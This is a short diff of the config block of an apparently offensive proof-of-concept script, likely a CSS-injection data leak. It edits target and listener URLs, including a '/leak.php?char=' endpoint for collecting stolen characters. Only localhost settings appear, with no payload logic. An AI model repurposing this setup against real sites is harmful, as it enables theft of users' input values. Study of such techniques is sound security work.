@@ -38,9 +38,9 @@
 
         <script>
             /* ==== CONFIG ==== */
-            const RHOST = "http://127.0.0.1/"
+            const RHOST = "http://127.0.0.1"
             const RURL = "/index.php?color=";  
-            const LHOST = "http://127.0.0.1:81/"
+            const LHOST = "http://127.0.0.1:81"
             const LURL_KNOWNCHARS = "/knownChars.php";
             const LURL_LEAKCHAR = "/leak.php?char=";
             const HTML_ELEMENT_NAME = "input";
